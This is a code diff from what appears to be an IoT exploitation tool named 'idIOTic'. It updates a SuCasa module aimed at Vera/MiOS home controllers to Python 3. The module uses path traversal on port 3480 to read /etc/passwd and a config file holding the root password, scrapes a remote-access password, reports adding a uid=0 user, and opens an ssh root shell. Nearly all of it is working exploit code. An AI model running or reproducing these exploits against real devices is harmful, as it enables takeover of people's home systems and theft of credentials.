@@ -32,12 +32,11 @@ class SuCasa(AnotherUI):
                 getpasswordfile <ip address of target>
 
         """
-        from urllib.request import urlopen
-#        import pdb;pdb.set_trace()
+        import urllib.request
         ip = args #das right, ghettostyles. caution to the wind. No error checkin. whatevs.
         print("[+] grabbing /etc/passwd...\n")
         url = "http://"+str(ip)+":3480/data_request?id=file&parameters=../../etc/passwd"
-        print(urlopen(url).read())
+        print(urllib.request.urlopen(url).read().decode("utf-8"))
 
     def do_setremoteroot(self, args):
         """
@@ -47,16 +46,14 @@ class SuCasa(AnotherUI):
                 setremoteroot <ip address of target>
 
         """
-        from urllib.request import urlopen
-#        import pdb;pdb.set_trace()
+        import urllib.request
         ip = args #das right, ghettostyles. caution to the wind. No error checkin. whatevs.
         url = "http://"+str(ip)+"/cgi-bin/cmh/tech_ra.sh"
-        password = str(urlopen(url).read().split("-")[1].split(" to the")[0])
+        password = str(urllib.request.urlopen(url).read().decode("utf-8").split("-")[1].split(" to the")[0])
         print("[+] adding remote user, uid=0,gid=0, password = %s" %password)
 
         print("[+] new /etc/passwd...\n")
         url = "http://"+str(ip)+":3480/data_request?id=file&parameters=../../etc/passwd"
-        #print(urlopen(url).read())
         print("[+] Ok done... ;-)")
         print("[+] Use the 'getrootshell' command in idIOTic or in a shell")
         print("[+] please exit idIOTic, and enter 'ssh remote@%(a)s' and then enter the password %(b)s" % {'a':ip,'b':password})
@@ -69,15 +66,14 @@ class SuCasa(AnotherUI):
                 getrootpassword <ip address of target>
 
         """
-        from urllib.request import urlopen
-#        import pdb;pdb.set_trace()
+        import urllib.request
         ip = args #das right, ghettostyles. caution to the wind. No error checkin. whatevs.
         url = "http://"+str(ip)+"/port_3480/data_request?id=file&parameters=../../etc/cmh/cmh.conf"
-        password = urlopen(url).read().split('\n')[9].split('=')[1]
+        password = str(urllib.request.urlopen(url).read().decode("utf-8").split('\n')[9].split('=')[1])
         print("[+] root password is '%s'" %password)
 
 
-        password = str(urlopen(url).read().split('\n')[9].split('=')[1])
+        password = str(urllib.request.urlopen(url).read().decode("utf-8").split('\n')[9].split('=')[1])
 
     def do_getrootshell(self, args):
         """
@@ -88,10 +84,9 @@ class SuCasa(AnotherUI):
                 getrootshell <ip address of target>
         """
         import subprocess
-#        import pdb;pdb.set_trace()
         ip = args #das right, ghettostyles. caution to the wind. No error checkin. whatevs.
         host = "remote@"+ip
-        print("[+] Connecting to rootshell...remember to enter the password supplied by 'setremoteroot'");
+        print("[+] Connecting to rootshell...remember to enter the password supplied by 'setremoteroot'")
         ret = subprocess.call(["ssh", host])
         
     def fetch_firmware(self, args):
@@ -101,4 +96,4 @@ class SuCasa(AnotherUI):
             Usage:
                 fetchfirmware 
         """
-        pass 
+        print("[+] Please browse to http://builder1204.mios.com/mt7620a_betafirmware/ for up-to-date firmware")
